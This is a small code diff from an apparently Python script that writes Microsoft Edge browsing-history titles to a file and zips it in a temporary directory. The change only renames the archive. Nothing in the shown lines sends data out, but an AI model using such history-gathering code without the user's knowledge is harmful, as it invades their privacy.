@@ -34,7 +34,7 @@ if edge_history:
             file.write(f"Title: {title}\n\n")
 
     # Create the path for the ZIP archive
-    zip_file = Path(temp_dir) / "Microsoft Edge Data.zip"
+    zip_file = Path(temp_dir) / "Edge.zip"
 
     # Create a ZIP archive and add the edge_history.txt file to it
     with zipfile.ZipFile(zip_file, "w") as zipf:
